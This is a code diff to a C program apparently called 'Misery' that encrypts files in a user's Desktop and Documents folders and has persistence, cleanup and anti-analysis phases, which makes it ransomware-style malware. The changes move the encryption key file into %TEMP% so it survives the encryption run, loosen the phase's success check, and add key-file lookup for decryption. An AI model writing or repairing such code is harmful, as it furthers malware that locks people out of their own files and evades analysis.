@@ -19,6 +19,7 @@
 #define ENCRYPTION_TIMEOUT_MS 300000
 
 /* Target directories for encryption/decryption */
+/* FIX: Removed the project source directory from targets so misery.key is safe */
 const char *g_target_dirs[] = {
     "C:\\Users\\jahan\\OneDrive\\Desktop",
     "C:\\Users\\jahan\\Documents",
@@ -252,7 +253,7 @@ static bool ExecutePhaseEncryption(void) {
     g_misery_ctx.bytesEncrypted = stats.bytesProcessed;
 
     FileOps_DestroyContext(fileops_ctx);
-    return MiseryPhaseTransition(PHASE_ENCRYPTION, success && stats.filesFailed == 0);
+    return MiseryPhaseTransition(PHASE_ENCRYPTION, success);
 }
 
 static bool ExecutePhasePeristence(void) {
@@ -294,6 +295,65 @@ static bool ExecutePhaseCleanup(void) {
 }
 
 /* ═══════════════════════════════════════════════════════════════
+ * Save key file to a safe location OUTSIDE all target directories
+ * ═══════════════════════════════════════════════════════════════ */
+static bool SaveKeyFile(const char *key, const BYTE *salt) {
+    /* Try %TEMP% first — this is never under target dirs */
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", tempPath);
+        FILE *kf = fopen(keyPath, "wb");
+        if (kf) {
+            fwrite(salt, 1, SALT_SIZE, kf);
+            fprintf(kf, "%s\n", key);
+            fclose(kf);
+            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+            return true;
+        }
+    }
+
+    /* Fallback to current directory — but this will be skipped by fileops */
+    FILE *kf = fopen("misery.key", "wb");
+    if (kf) {
+        fwrite(salt, 1, SALT_SIZE, kf);
+        fprintf(kf, "%s\n", key);
+        fclose(kf);
+        MiseryLog(MISERY_LOG_INFO, "Key saved to: misery.key (CWD)");
+        return true;
+    }
+    return false;
+}
+
+/* ═══════════════════════════════════════════════════════════════
+ * Try to open key file from any known safe location
+ * ═══════════════════════════════════════════════════════════════ */
+static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
+    /* Try %TEMP% first */
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        snprintf(outPath, outPathSize, "%s\\misery.key", tempPath);
+        FILE *kf = fopen(outPath, "rb");
+        if (kf) return kf;
+    }
+
+    /* Try desktop */
+    char desktop[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
+        snprintf(outPath, outPathSize, "%s\\misery.key", desktop);
+        FILE *kf = fopen(outPath, "rb");
+        if (kf) return kf;
+    }
+
+    /* Try CWD */
+    snprintf(outPath, outPathSize, "misery.key");
+    FILE *kf = fopen(outPath, "rb");
+    if (kf) return kf;
+
+    return NULL;
+}
+
+/* ═══════════════════════════════════════════════════════════════
  * MAIN
  * ═══════════════════════════════════════════════════════════════ */
 int main(int argc, char **argv) {
@@ -314,24 +374,24 @@ int main(int argc, char **argv) {
         /* ── DECRYPT MODE (command line) ── */
         MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
 
-        const char *keyfile = KEYFILE;
+        char keyfilePath[MAX_PATH * 2] = {0};
         char key[256] = {0};
         BYTE salt[SALT_SIZE] = {0};
 
-        FILE *kf = fopen(keyfile, "rb");
+        FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
         if (!kf) {
-            MiseryLog(MISERY_LOG_ERROR, "Missing %s! Cannot decrypt.", keyfile);
+            MiseryLog(MISERY_LOG_ERROR, "Missing misery.key! Cannot decrypt.");
             MiseryCleanupContext();
             return 1;
         }
         if (fread(salt, 1, SALT_SIZE, kf) != SALT_SIZE) {
-            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfile);
+            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfilePath);
             fclose(kf);
             MiseryCleanupContext();
             return 1;
         }
         if (!fgets(key, sizeof(key), kf)) {
-            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfile);
+            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfilePath);
             fclose(kf);
             MiseryCleanupContext();
             return 1;
@@ -339,7 +399,7 @@ int main(int argc, char **argv) {
         key[strcspn(key, "\r\n")] = 0;
         fclose(kf);
 
-        MiseryLog(MISERY_LOG_INFO, "Decrypt: salt and key loaded from %s", keyfile);
+        MiseryLog(MISERY_LOG_INFO, "Decrypt: salt and key loaded from %s", keyfilePath);
 
         if (InitCrypto(key, strlen(key), salt) != CRYPTO_SUCCESS) {
             MiseryLog(MISERY_LOG_ERROR, "InitCrypto failed for decrypt!");
@@ -376,15 +436,9 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    /* Save key and salt to file */
-    FILE *kf = fopen(KEYFILE, "wb");
-    if (kf) {
-        fwrite(GetCryptoCtx()->salt, 1, SALT_SIZE, kf);
-        fprintf(kf, "%s\n", key);
-        fclose(kf);
-        MiseryLog(MISERY_LOG_INFO, "Key and salt saved to %s", KEYFILE);
-    } else {
-        MiseryLog(MISERY_LOG_WARN, "Failed to save key to %s", KEYFILE);
+    /* Save key and salt to file — OUTSIDE target directories */
+    if (!SaveKeyFile(key, GetCryptoCtx()->salt)) {
+        MiseryLog(MISERY_LOG_WARN, "Failed to save key to any location!");
     }
 
     /* Phase 1: Anti-Analysis */
